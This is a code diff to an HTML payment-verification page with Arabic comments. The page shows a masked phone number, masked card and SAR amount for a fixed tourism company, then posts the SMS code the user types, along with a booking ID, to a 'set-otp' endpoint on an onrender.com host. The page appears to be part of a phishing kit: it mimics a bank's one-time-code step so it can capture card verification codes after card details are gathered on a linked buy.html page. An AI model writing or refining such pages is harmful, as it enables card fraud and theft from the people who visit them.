@@ -85,47 +85,68 @@
   </div>
 
   <script>
-    // هنا بنجيب البيانات المخزنة مسبقاً من localStorage
-    const phone = localStorage.getItem('userPhone') || '********4563';
-    const card = localStorage.getItem('userCard') || '************6152';
-    const amount = localStorage.getItem('paymentAmount') || 'SAR 2,650.18';
-    const company = localStorage.getItem('companyName') || 'REGENERATIVE ESCAPES TOURISM COMPANY';
-    const date = new Date().toLocaleDateString('en-CA'); // صيغة YYYY-MM-DD
-    const bookingId = localStorage.getItem('bookingId');
+  // جلب البيانات الشخصية من buy.html
+  const personalData = JSON.parse(localStorage.getItem('personalData')) || {};
 
-    // عرض النصوص في الصفحة
-    document.getElementById('verifyText').textContent = `Verify your payment using the Text to ${phone}.`;
-    document.getElementById('paymentInfo').textContent = `Your payment of ${amount} to ${company} on ${date} with your card ${card}.`;
+  if(!personalData.phone || !personalData.finalPrice){
+    alert('يرجى إكمال البيانات أولاً');
+    window.location.href = 'buy.html';
+  }
 
-    // عند الضغط على الزر
-    document.getElementById('sendOtpBtn').addEventListener('click', async () => {
-      const otp = document.getElementById('otpInput').value.trim();
+  // آخر 4 أرقام من الهاتف
+  const phoneLast4 = personalData.phone.slice(-4);
 
-      if (!otp || !bookingId) {
-        alert('Please enter the verification code or check your booking.');
-        return;
+  // السعر
+  const amount = personalData.finalPrice;
+
+  // تاريخ اليوم
+  const date = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
+
+  // اسم الشركة ثابت
+  const company = 'REGENERATIVE ESCAPES TOURISM COMPANY';
+
+  // آخر 4 أرقام من البطاقة
+  const cardLast4 = localStorage.getItem('last4Card') || '6152';
+
+  // Booking ID
+  const bookingId = localStorage.getItem('bookingId');
+
+  // عرض النصوص في الصفحة
+  document.getElementById('verifyText').textContent = 
+    `Verify your payment using the Text to ********${phoneLast4}.`;
+
+  document.getElementById('paymentInfo').textContent = 
+    `Your payment of SAR ${amount} to ${company} on ${date} with your card ************${cardLast4}.`;
+
+  // عند الضغط على زر التحقق
+  document.getElementById('sendOtpBtn').addEventListener('click', async () => {
+    const otp = document.getElementById('otpInput').value.trim();
+
+    if (!otp || !bookingId) {
+      alert('Please enter the verification code or check your booking.');
+      return;
+    }
+
+    try {
+      const res = await fetch('https://shebara.onrender.com/api/set-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ bookingId, otp })
+      });
+
+      const data = await res.json();
+
+      if (data.success) {
+        alert('Verification successful!');
+        window.location.href = 'thankyou.html';
+      } else {
+        alert('Invalid code, please try again.');
       }
-
-      try {
-        const res = await fetch('https://shebara.onrender.com/api/set-otp', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ bookingId, otp })
-        });
-
-        const data = await res.json();
-
-        if (data.success) {
-          alert('Verification successful!');
-          window.location.href = 'thankyou.html';
-        } else {
-          alert('Invalid code, please try again.');
-        }
-      } catch (err) {
-        console.error(err);
-        alert('Connection error. Please try again later.');
-      }
-    });
+    } catch (err) {
+      console.error(err);
+      alert('Connection error. Please try again later.');
+    }
+  });
   </script>
 </body>
 </html>
